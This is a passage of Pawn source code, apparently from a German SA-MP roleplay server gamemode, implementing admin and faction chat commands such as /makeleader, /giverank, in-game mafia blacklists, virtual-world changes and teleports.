						        IRCInfo[6][iNeedPass] = 0; IRCInfo[6][iLock] = 0;
						    }
						    case 8:
						    {
						        strmid(IRCInfo[7][iAdmin], string, 0, strlen(string), 255);
						        IRCInfo[7][iNeedPass] = 0; IRCInfo[7][iLock] = 0;
						    }
						    case 9:
						    {
						        strmid(IRCInfo[8][iAdmin], string, 0, strlen(string), 255);
						        IRCInfo[8][iNeedPass] = 0; IRCInfo[8][iLock] = 0;
						    }
						    case 10:
						    {
						        strmid(IRCInfo[9][iAdmin], string, 0, strlen(string), 255);
						        IRCInfo[9][iNeedPass] = 0; IRCInfo[9][iLock] = 0;
						    }
						}
						SaveIRC();
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist Offline !");
				    return 1;
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Du bist nicht befugt !");
			    return 1;
			}
		}
		return 1;
	}
//----------------------------------[MAKELEADER]------------------------------------------------
	if(strcmp(cmd, "/makeleader", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pAdmin] < 3)
	        {
	            SendClientMessage(playerid, COLOR_GRAD1, "Dazu bist du nicht befugt!");
	            return 1;
			}
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_YELLOW, "Benutze: /makeleader [playerid/Name] [Nummer(1-24)]");
				SendClientMessage(playerid, COLOR_YELLOW, "Fraktionen: 1 LSPD, 2 FBI, 3 Bundeswehr, 4 Medic, 5 LCN, 6 Yakuza, 7 Präsi, 8 Hitman");
				SendClientMessage(playerid, COLOR_YELLOW, "Fraktionen: 9 San News, 10 Transport GmbH, 11 Fahrlehrer, 12 Triaden, 13 Gs, 14 Ballas, 15 Feuerwehr, 16 Vagos");
				SendClientMessage(playerid, COLOR_YELLOW, "Fraktionen: 17 Aztecas, 18 Rifas, 19 RS, 20 Terror, 21 Wheelmen, 22 S.W.A.T, 23 Brigada, 24 O-Amt");
				return 1;
			}
			new para1;
		 	new level;
			para1 = ReturnUser(tmp);
			tmp = strtoknew(cmdtext, idx);
			level = strval(tmp);
			if(level > 24 || level < 1) { SendClientMessage(playerid, COLOR_GREY, "   Geh nicht tiefer als Nummer 1, oder höher als Nummer 24! Leader Kicken: /rauswerfen"); return 1; }
			if (PlayerInfo[playerid][pAdmin] >= 1337)
			{
			    if(IsPlayerConnected(para1))
			    {
			        if(para1 != INVALID_PLAYER_ID)
			        {
//			            if(PlayerInfo[para1][pMember] > 0 || PlayerInfo[para1][pFMember] < 255)
//			            {
//			                SendClientMessage(playerid, COLOR_GREY, "   Dieser Player ist bereits/noch in einer Fraktion!");
//			                return 1;
//			            }
			            if(PlayerInfo[para1][pFrakSperre] > 0)
			            {
			                SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler hat Fraktionssperre!");
			                return 1;
			            }
			            new ftext[32];
			            if(level == 0) {
						ftext = "Zivilisten";
                        PlayerInfo[para1][pLeader] = 0;
						gTeam[para1] = 3;
						PlayerInfo[para1][pTeam] = 3;
						PlayerInfo[para1][pMember] = 0;
						PlayerInfo[para1][sMember] = 0;
						PlayerInfo[para1][pRank] = 0;
						PlayerInfo[para1][pGehalt] = 0;

						} else { ftext = Fracs[(level-1)]; }
						GetPlayerName(para1, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));

						GivePlayerForumRights(para1,level,PlayerInfo[para1][sMember]);

						format(string, sizeof(string), "Du hast %s die Leaderrechte der Fraktion %s gegeben.", giveplayer,ftext);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "Admin %s hat dich zum Leader von der Fraktion %s ernannt.", sendername,ftext);
						SendClientMessage(para1, COLOR_LIGHTBLUE, string);
						SendClientMessage(para1, COLOR_GRAD5, "Du kannst mit /help deine neuen Fraktionsbefehle betrachten");
						gTeam[para1] = 0;
					    PlayerInfo[para1][pTeam] = 0;
					    PlayerInfo[para1][pRank] = 12;
					    PlayerInfo[para1][pMember] = level;
					    PlayerInfo[para1][sMember] = level;
					    PlayerInfo[para1][pLeader] = level;
					    PlayerInfo[para1][pGehalt] = 0;
						new iyear, imonth,iday;
						getdate(iyear, imonth, iday);
						format(string, sizeof(string), "%s[Level:%d] wurde von %s Als Leader der Fraktion %s eingeladen (%d-%d-%d)", giveplayer,PlayerInfo[para1][pLevel],sendername,ftext,imonth,iday,iyear);
						LeaderLog(string);
				 //   	GivePlayerForumRechte(para1);
						if(level == 0)
						{
/*
							WBB_RemoveUserFromGroup(para1, 48);

							WBB_RemoveUserFromGroup(para1, 49);

							WBB_RemoveUserFromGroup(para1, 51);

							WBB_RemoveUserFromGroup(para1, 53);

							WBB_RemoveUserFromGroup(para1, 59);

							WBB_RemoveUserFromGroup(para1, 61);

							WBB_RemoveUserFromGroup(para1, 47);

							WBB_RemoveUserFromGroup(para1, 56);

							WBB_RemoveUserFromGroup(para1, 54);

							WBB_RemoveUserFromGroup(para1, 74);

							WBB_RemoveUserFromGroup(para1, 55);

							WBB_RemoveUserFromGroup(para1, 73);

							WBB_RemoveUserFromGroup(para1, 57);

							WBB_RemoveUserFromGroup(para1, 63);

							WBB_RemoveUserFromGroup(para1, 72);

							WBB_RemoveUserFromGroup(para1, 71);

							WBB_RemoveUserFromGroup(para1, 70);

							WBB_RemoveUserFromGroup(para1, 69);

							WBB_RemoveUserFromGroup(para1, 68);

							WBB_RemoveUserFromGroup(para1, 58);

							WBB_RemoveUserFromGroup(para1, 62);

							WBB_RemoveUserFromGroup(para1, 50);

							WBB_RemoveUserFromGroup(para1, 60);

							WBB_RemoveUserFromGroup(para1, 52);
*/
		                	gTeam[para1] = 3;
							PlayerInfo[para1][pTeam] = 3;
							PlayerInfo[para1][pLeader] = 0;
							PlayerInfo[para1][sMember] = 0;
							PlayerInfo[para1][pRank] = 0;
							PlayerInfo[para1][pChar] = 0;
		                    SkinStatus[para1] = para1;
		                    SetPlayerPos(para1, 1497.9749,-1664.6473,34.0469);
					        SetPlayerCameraPos(para1, 1492.5426,-1664.8420,36.3946);
					        SetPlayerCameraLookAt(para1, 1494.4083,-1664.8248,35.7894);
				        	SetPlayerFacingAngle(para1, 88.4779);
						    FreezePlayer(para1);
			        	    SetPlayerInterior(para1, 0);
						    SendClientMessage(para1, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
		 				    SendClientMessage(para1, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(para1, 3);
						return 1;
						}
	                    SetPlayerPos(para1, 1497.9749,-1664.6473,34.0469);
				        SetPlayerCameraPos(para1, 1492.5426,-1664.8420,36.3946);
				        SetPlayerCameraLookAt(para1, 1494.4083,-1664.8248,35.7894);
			            SetPlayerFacingAngle(para1, 88.4779);
						SelectChar[para1] = 255;
						SelectCharID[para1] = level;
						SelectCharPlace[para1] = 1;
						PlayerInfo[para1][pModel] = ChosenSkin[para1];
						PlayerInfo[para1][pChar] = ChosenSkin[para1];
					    FreezePlayer(para1);
		        	    SetPlayerInterior(para1, 0);
					    SendClientMessage(para1, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
	 				    SendClientMessage(para1, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
						SetPlayerVirtualWorld(para1, 3);
/*
					    if(level == 1)
					    {
							WBB_AddUserToGroup(para1, 48);
						}
					    else if(level == 2)
					    {
							WBB_AddUserToGroup(para1, 49);
						}
					    else if(level == 3)
					    {
							WBB_AddUserToGroup(para1, 51);
						}
					    else if(level == 4)
					    {
							WBB_AddUserToGroup(para1, 53);
						}
					    else if(level == 5)
					    {
							WBB_AddUserToGroup(para1, 59);
						}
					    else if(level == 6)
					    {
							WBB_AddUserToGroup(para1, 61);
						}
					    else if(level == 7)
					    {
							WBB_AddUserToGroup(para1, 47);
						}
					    else if(level == 8)
					    {
							WBB_AddUserToGroup(para1, 56);
						}
					    else if(level == 9)
					    {
							WBB_AddUserToGroup(para1, 54);
						}
					    else if(level == 10)
					    {
							WBB_AddUserToGroup(para1, 74);
						}
					    else if(level == 11)
					    {
							WBB_AddUserToGroup(para1, 55);
						}
					    else if(level == 12)
					    {
							WBB_AddUserToGroup(para1, 73);
						}
					    else if(level == 13)
					    {
							WBB_AddUserToGroup(para1, 57);
						}
					    else if(level == 14)
					    {
							WBB_AddUserToGroup(para1, 63);
						}
					    else if(level == 15)
					    {
							WBB_AddUserToGroup(para1, 72);
						}
					    else if(level == 16)
					    {
							WBB_AddUserToGroup(para1, 71);
						}
					    else if(level == 17)
					    {
							WBB_AddUserToGroup(para1, 70);
						}
					    else if(level == 18)
					    {
							WBB_AddUserToGroup(para1, 69);
						}
					    else if(level == 19)
					    {
							WBB_AddUserToGroup(para1, 68);
						}
					    else if(level == 20)
					    {
							WBB_AddUserToGroup(para1, 58);
						}
					    else if(level == 21)
					    {
							WBB_AddUserToGroup(para1, 62);
						}
					    else if(level == 22)
					    {
							WBB_AddUserToGroup(para1, 50);
						}
					    else if(level == 23)
					    {
							WBB_AddUserToGroup(para1, 60);
						}
					    else if(level == 24)
					    {
							WBB_AddUserToGroup(para1, 52);
						}
*/
					}
				}//not connected
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   ** INFO: Das ist ein Adminbefehl, Du bist nicht befugt!");
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/forceskin", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "NUTZUNG: /forceskin [playerid]");
				return 1;
			}
			new para1;
			para1 = ReturnUser(tmp);
			if (PlayerInfo[playerid][pAdmin] >= 4)
			{
			    if(IsPlayerConnected(para1))
			    {
			        if(para1 != INVALID_PLAYER_ID)
			        {
						GetPlayerName(para1, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, sizeof(string), "* Du wurdest von Admin %s gezwungen deinen Skin zu wechseln.", sendername);
						SendClientMessage(para1, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* Du hast %s gezwungen den Skin zu wechseln.", giveplayer);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);

						if(PlayerInfo[para1][sMember] == 0)
	                    {
		                    SkinStatus[para1] = para1;
		                    SetPlayerPos(para1, 1497.9749,-1664.6473,34.0469);
					        SetPlayerCameraPos(para1, 1492.5426,-1664.8420,36.3946);
					        SetPlayerCameraLookAt(para1, 1494.4083,-1664.8248,35.7894);
				        	SetPlayerFacingAngle(para1, 88.4779);
						    FreezePlayer(para1);
			        	    SetPlayerInterior(para1, 0);
						    SendClientMessage(para1, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
		 				    SendClientMessage(para1, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(para1, 3);
	                    }
	                    else if(PlayerInfo[para1][sMember] >= 1)
	                    {
		                    SetPlayerPos(para1, 1497.9749,-1664.6473,34.0469);
					        SetPlayerCameraPos(para1, 1492.5426,-1664.8420,36.3946);
					        SetPlayerCameraLookAt(para1, 1494.4083,-1664.8248,35.7894);
				            SetPlayerFacingAngle(para1, 88.4779);
							SelectChar[para1] = 255;
							SelectCharID[para1] = PlayerInfo[para1][sMember];
							SelectCharPlace[para1] = 1;
							PlayerInfo[para1][pModel] = ChosenSkin[para1];
							PlayerInfo[para1][pChar] = ChosenSkin[para1];
						    FreezePlayer(para1);
			        	    SetPlayerInterior(para1, 0);
						    SendClientMessage(para1, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
		 				    SendClientMessage(para1, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(para1, 3);
						}
					}
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Du darfst diesen Befehl nicht benutzen!");
			}
		}
		return 1;
	}

//----------------------------------[Blacklist für Mafien Rs ,Russenmafia,LCN,Yakuza]------------------------------------------------
    if(strcmp(cmd, "/clearblacklist", true) == 0  || strcmp(cmd, "/clearbl", true) == 0)
    {
        new mafid = GetPlayerMafia(playerid);
        if(PlayerInfo[playerid][pLeader] == 5 || PlayerInfo[playerid][pLeader] == 6 ||PlayerInfo[playerid][pLeader] == 12|| PlayerInfo[playerid][pLeader] == 13 ||PlayerInfo[playerid][pLeader] == 14|| PlayerInfo[playerid][pLeader] == 15 ||PlayerInfo[playerid][pLeader] == 16|| PlayerInfo[playerid][pLeader] == 17 ||PlayerInfo[playerid][pLeader] == 18||PlayerInfo[playerid][pLeader] == 19||PlayerInfo[playerid][pLeader] == 23)
        {
            strmid(Blacklist[mafid][user10],"Niemand",0,strlen("Niemand"),255);
            strmid(Blacklist[mafid][user9],"Niemand",0,strlen("Niemand"),255);
            strmid(Blacklist[mafid][user8],"Niemand",0,strlen("Niemand"),255);
            strmid(Blacklist[mafid][user7],"Niemand",0,strlen("Niemand"),255);
            strmid(Blacklist[mafid][user6],"Niemand",0,strlen("Niemand"),255);
            strmid(Blacklist[mafid][user5],"Niemand",0,strlen("Niemand"),255);
            strmid(Blacklist[mafid][user4],"Niemand",0,strlen("Niemand"),255);
            strmid(Blacklist[mafid][user3],"Niemand",0,strlen("Niemand"),255);
            strmid(Blacklist[mafid][user2],"Niemand",0,strlen("Niemand"),255);
            strmid(Blacklist[mafid][user1],"Niemand",0,strlen("Niemand"),255);
            SendClientMessage(playerid,COLOR_YELLOW,"Blacklist gecleart");
        }
    }
    if(strcmp(cmd, "/setblacklist", true) == 0)
    {
        tmp = strtoknew(cmdtext, idx);
        if(!strlen(tmp))
        {
            SendClientMessage(playerid, COLOR_GRAD1, "FEHLER: /setblacklist [id]");
            return 1;
        }
        new blid = strval(tmp);
        if(IsPlayerConnected(blid))
        {
            if(IsPlayerNPC(blid))
			{
            	SendClientMessage(playerid, COLOR_GREY, "   Du kannst kein Auftrag auf ein Bot geben");
       	 		return 1;
       		}
            new mafid = GetPlayerMafia(playerid);
            new plName[MAX_PLAYER_NAME];
            new sendName[MAX_PLAYER_NAME];
            GetPlayerName(playerid,sendName,sizeof(sendName));
            GetPlayerName(blid,plName,sizeof(plName));
            strmid(Blacklist[mafid][user10],Blacklist[mafid][user9],0,strlen(Blacklist[mafid][user9]),255);
            strmid(Blacklist[mafid][user9],Blacklist[mafid][user8],0,strlen(Blacklist[mafid][user8]),255);
            strmid(Blacklist[mafid][user8],Blacklist[mafid][user7],0,strlen(Blacklist[mafid][user7]),255);
            strmid(Blacklist[mafid][user7],Blacklist[mafid][user6],0,strlen(Blacklist[mafid][user6]),255);
            strmid(Blacklist[mafid][user6],Blacklist[mafid][user5],0,strlen(Blacklist[mafid][user5]),255);
            strmid(Blacklist[mafid][user5],Blacklist[mafid][user4],0,strlen(Blacklist[mafid][user4]),255);
            strmid(Blacklist[mafid][user4],Blacklist[mafid][user3],0,strlen(Blacklist[mafid][user3]),255);
            strmid(Blacklist[mafid][user3],Blacklist[mafid][user2],0,strlen(Blacklist[mafid][user2]),255);
            strmid(Blacklist[mafid][user2],Blacklist[mafid][user1],0,strlen(Blacklist[mafid][user1]),255);
            strmid(Blacklist[mafid][user1],plName,0,strlen(plName),255);
            IsBlacklist[blid] = 1;
            if(mafid==1)
            {
                new famstr[256];
                format(famstr,sizeof(famstr),"%s hat %s auf die Blacklist gesetzt!",sendName,plName);
                SendFamilyMessage(5,COLOR_RED,famstr);
            }
            else if(mafid==2)
            {
                new famstr[256];
                format(famstr,sizeof(famstr),"%s hat %s auf die Blacklist gesetzt!",sendName,plName);
                SendFamilyMessage(6,COLOR_RED,famstr);
            }
            else if(mafid==3)
            {
                new famstr[256];
                format(famstr,sizeof(famstr),"%s hat %s auf die Blacklist gesetzt!",sendName,plName);
                SendFamilyMessage(16,COLOR_RED,famstr);
            }
            else if(mafid==4)
            {
                new famstr[256];
                format(famstr,sizeof(famstr),"%s hat %s auf die Blacklist gesetzt!",sendName,plName);
                SendFamilyMessage(17,COLOR_RED,famstr);
            }
            else if(mafid==5)
            {
                new famstr[256];
                format(famstr,sizeof(famstr),"%s hat %s auf die Blacklist gesetzt!",sendName,plName);
                SendFamilyMessage(17,COLOR_RED,famstr);
            }
            else if(mafid==6)
            {
                new famstr[256];
                format(famstr,sizeof(famstr),"%s hat %s auf die Blacklist gesetzt!",sendName,plName);
                SendFamilyMessage(17,COLOR_RED,famstr);
            }
            else if(mafid==7)
            {
                new famstr[256];
                format(famstr,sizeof(famstr),"%s hat %s auf die Blacklist gesetzt!",sendName,plName);
                SendFamilyMessage(17,COLOR_RED,famstr);
            }
            else if(mafid==8)
            {
                new famstr[256];
                format(famstr,sizeof(famstr),"%s hat %s auf die Blacklist gesetzt!",sendName,plName);
                SendFamilyMessage(17,COLOR_RED,famstr);
            }
            else if(mafid==9)
            {
                new famstr[256];
                format(famstr,sizeof(famstr),"%s hat %s auf die Blacklist gesetzt!",sendName,plName);
                SendFamilyMessage(17,COLOR_RED,famstr);
            }
            else if(mafid==10)
            {
                new famstr[256];
                format(famstr,sizeof(famstr),"%s hat %s auf die Blacklist gesetzt!",sendName,plName);
                SendFamilyMessage(17,COLOR_RED,famstr);
            }
            else if(mafid==11)
            {
                new famstr[256];
                format(famstr,sizeof(famstr),"%s hat %s auf die Blacklist gesetzt!",sendName,plName);
                SendFamilyMessage(17,COLOR_RED,famstr);
            }
            return 1;
        }
        else return SendClientMessage(playerid, COLOR_GRAD1, "Der Spieler ist nicht Online!");
    }

    if(strcmp(cmd, "/blacklist", true) == 0)
    {
        new mafid = GetPlayerMafia(playerid);
        if(mafid==1||mafid==2||mafid==3||mafid==4||mafid==5||mafid==6||mafid==7||mafid==8||mafid==9||mafid==10||mafid==11)
        {
        new blstr[256];
        SendClientMessage(playerid,COLOR_GREEN,"-----Blacklist-----");
        format(blstr,sizeof(blstr),"1. %s",Blacklist[mafid][user1]);
        SendClientMessage(playerid,COLOR_GREEN,blstr);
        format(blstr,sizeof(blstr),"2. %s",Blacklist[mafid][user2]);
        SendClientMessage(playerid,COLOR_GREEN,blstr);
        format(blstr,sizeof(blstr),"3. %s",Blacklist[mafid][user3]);
        SendClientMessage(playerid,COLOR_GREEN,blstr);
        format(blstr,sizeof(blstr),"4. %s",Blacklist[mafid][user4]);
        SendClientMessage(playerid,COLOR_GREEN,blstr);
        format(blstr,sizeof(blstr),"5. %s",Blacklist[mafid][user5]);
        SendClientMessage(playerid,COLOR_GREEN,blstr);
        format(blstr,sizeof(blstr),"6. %s",Blacklist[mafid][user6]);
        SendClientMessage(playerid,COLOR_GREEN,blstr);
        format(blstr,sizeof(blstr),"7. %s",Blacklist[mafid][user7]);
        SendClientMessage(playerid,COLOR_GREEN,blstr);
        format(blstr,sizeof(blstr),"8. %s",Blacklist[mafid][user8]);
        SendClientMessage(playerid,COLOR_GREEN,blstr);
        format(blstr,sizeof(blstr),"9. %s",Blacklist[mafid][user9]);
        SendClientMessage(playerid,COLOR_GREEN,blstr);
        format(blstr,sizeof(blstr),"10. %s",Blacklist[mafid][user10]);
        SendClientMessage(playerid,COLOR_GREEN,blstr);
        }
        else return SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Gang oder Mafia Mitglied!");
	return 1;
    }

//----------------------------------[GIVERANK]------------------------------------------------
	if(strcmp(cmd, "/giverank", true) == 0 || strcmp(cmd, "/giverang", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "NUTZUNG: /giverang [playerid] [Rang(1-6)]");
				return 1;
			}
			new para1;
			new level;
			para1 = ReturnUser(tmp);
			tmp = strtoknew(cmdtext, idx);
			level = strval(tmp);
			if(level > 12 || level < 0) { SendClientMessage(playerid, COLOR_GREY, "Ränge gehen nur von 1 bis 12!"); return 1; }
			if (PlayerInfo[playerid][pLeader] >= 1)
			{
			    if(IsPlayerConnected(para1))
			    {
			        if(para1 != INVALID_PLAYER_ID)
			        {
			            if(PlayerInfo[playerid][pLeader] == PlayerInfo[para1][pMember] && PlayerInfo[playerid][pAdmin] <= 4)
			            {
							GetPlayerName(para1, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							PlayerInfo[para1][pRank] = level;
							format(string, sizeof(string), "   Du wurdest von %s zum Rang %d gemacht",sendername,level);
							SendClientMessage(para1, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "   Du hast %s Rang %d gegeben.",giveplayer,level);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						}
			            else if(PlayerInfo[playerid][pLeader] == PlayerInfo[para1][pLeader])
			            {
							GetPlayerName(para1, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							PlayerInfo[para1][pRank] = level;
							format(string, sizeof(string), "   Du wurdest von %s zum Rang %d gemacht",sendername,level);
							SendClientMessage(para1, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "   Du hast %s Rang %d gegeben.",giveplayer,level);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						}
			            else if(PlayerInfo[playerid][pAdmin] >= 1337)
			            {
							GetPlayerName(para1, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							PlayerInfo[para1][pRank] = level;
							format(string, sizeof(string), "   Du wurdest von %s zum Rang %d gemacht",sendername,level);
							SendClientMessage(para1, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "   Du hast %s Rang %d gegeben.",giveplayer,level);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						}
						else
						{
							SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht der Leader des Spielers!");
						}
					}
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Du darfst diesen Befehl nicht benutzen(Nur Leader)!");
			}
		}
		return 1;
	}
//----------------------------------[setteam]------------------------------------------------
	if(strcmp(cmd, "/setteam", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /setteam [playerid] [team 1(civ) - 2(cop)]");
				return 1;
			}
			new para1;
			new level;
			para1 = ReturnUser(tmp);
			tmp = strtoknew(cmdtext, idx);
			level = strval(tmp);
			if (PlayerInfo[playerid][pAdmin] >= 2)
			{
			    if(IsPlayerConnected(para1))
			    {
			        if(para1 != INVALID_PLAYER_ID)
			        {
						GetPlayerName(para1, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						PlayerInfo[para1][pTeam] = level;
						gTeam[para1] = level;
						//SetPlayerWeapons(para1);
						SetPlayerSpawn(para1);
						ClearCrime(para1);
						printf("AdmCmd: %s hat %s in Team %d geswitscht.", sendername, giveplayer, level);
						format(string, sizeof(string), "   Du wurdest zum Team %d geswitcht Von %s", level, sendername);
						SendClientMessage(para1, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "   Du hast %s zu Team %d geswitcht.", giveplayer,level);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					}
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Du darfst diesen Befehl nicht benutzen!!");
			}
		}
		return 1;
	}
//========== VIRTUELLE WELT ===========//
	if(strcmp(cmd, "/setvw", true) == 0)
	{
	    if(PlayerInfo[playerid][pAdmin] < 1330)
	    {
	        SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht befugt!");
	        return 1;
		}
		tmp = strtoknew(cmdtext, idx);
		if(!strlen(tmp))
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "Benutzung: /setvw [Virtuelle Welt]");
		    return 1;
		}
		new vw;
  		vw = strval(tmp);
  		SetPlayerVirtualWorld(playerid, vw);
  		format(string, sizeof(string), "Neue Virtuelle Welt: %d", vw);
  		SendClientMessage(playerid, COLOR_GREEN, string);
  		return 1;
	}
	if(strcmp(cmd, "/setplayervw", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /setplayervw [Spieler ID / Name] [Virtuelle Welt]");
				return 1;
			}
			new playa;
			playa = ReturnUser(tmp);
			new vw;
			tmp = strtoknew(cmdtext, idx);
			vw = strval(tmp);
			if (PlayerInfo[playerid][pAdmin] >= 1330)
			{
			    if(IsPlayerConnected(playa))
			    {
			        if(playa != INVALID_PLAYER_ID)
			        {
			    		GetPlayerName(playa, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						SetPlayerVirtualWorld(playa, vw);
						format(string, sizeof(string), " Du hast %s's Virtuelle Welt auf %d gesetzt.", giveplayer, vw);
						SendClientMessage(playerid, COLOR_GRAD1, string);
						format(string, sizeof(string), " %s hat deine Virtuelle Welt auf %d gesetzt.", sendername, vw);
						SendClientMessage(playa, COLOR_GRAD1, string);
					}
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   You are not authorized to use that command!");
			}
		}
		return 1;
	}

	if(strcmp(cmd,"/spawn",true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /spawn [playerid]");
				return 1;
			}
			new para1;
			para1 = ReturnUser(tmp);
			if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pSupporter] >= 1)
			{
			    if(IsPlayerConnected(para1))
			    {
			        if(para1 != INVALID_PLAYER_ID)
			        {
						SetPlayerSpawn(para1);
						SendClientMessage(playerid, COLOR_GREEN, "Spieler erfolgreich gespawnt!");
					}
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Du darfst diesen Befehl nicht benutzen!!");
			}
		}
		return 1;
	}
//----------------------------------[GOTO]-----------------------------------------------
	if(strcmp(cmd, "/gotons", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(PlayerInfo[playerid][pAdmin] >= 3)
			{
				if (GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePos(tmpcar, 857.4366,-1663.0399,13.5524);
					LinkVehicleToInterior(tmpcar,0);
					TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				}
				else
				{
					SetPlayerPos(playerid, 857.4366,-1663.0399,13.5524);
				}
				SendClientMessage(playerid, COLOR_GRAD1, "Du hast dich zum Zivispawn geportet.");
				SetPlayerInterior(playerid,0);
				PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht befugt !");
			}
		}
		return 1;
	}

	if(strcmp(cmd, "/gotomc", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(PlayerInfo[playerid][pAdmin] >= 3)
			{
				if (GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePos(tmpcar, -2336.8794,-1602.8849,483.7280);
					TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				}
				else
				{
					SetPlayerPos(playerid, -2336.8794,-1602.8849,483.7280);
				}
				SendClientMessage(playerid, COLOR_GRAD1, "  Du hast dich teleportiert!");
				SetPlayerInterior(playerid,0);
				PlayerInfo[playerid][pInt] = 0;
		    	SetPlayerVirtualWorld(playerid, 0);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Du darfst diesen Befehl nicht benutzen !");
			}
		}
		return 1;
	}

//=============HITMAN MASKE ANFANG=======================
    if(strcmp(cmd,"/hmaske",true)==0)
    {
	    if(IsPlayerConnected(playerid))
	    {
	  		if(PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pLeader] == 8 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pMember] == 21 || PlayerInfo[playerid][pLeader] == 21)
	    	{
    			for (new i = 0, j = MAX_PLAYERS; i < j; i ++)
    			{
				ShowPlayerNameTagForPlayer(i, playerid, 0);
				}
				SendClientMessage(playerid, COLOR_RED,"Du hast deine Maske angezogen! (/maskeaus um sie auszuziehen)");
			}
		}
		return 1;
	}
    if(strcmp(cmd,"/maskeaus",true)==0)
    {
		if(IsPlayerConnected(playerid))
		{
	  		if(PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pLeader] == 8 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pMember] == 21 || PlayerInfo[playerid][pLeader] == 21)
	    	{

   				for (new i = 0, j = MAX_PLAYERS; i < j; i ++)
    			{
				ShowPlayerNameTagForPlayer(i, playerid, 1);
			//	OnPlayerCommandText(playerid,string);
				}
				SendClientMessage(playerid, COLOR_RED,"Du hast deine Maske ausgezogen!");
        	}
   		}
   		return 1;
	}
    //===============OLICHT====================
    if(strcmp(cmdtext, "/olicht", true) == 0)
		{
			if(IsPlayerConnected(playerid))
			{
				if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 525)
				{
				    if(Olicht[GetPlayerVehicleID(playerid)] == 0)
				    {
						light1[GetPlayerVehicleID(playerid)] = CreateDynamicObject(19154,-0.0089111328, 0.273193359, 1.4037838, 0.0, 0.0, 96.0);
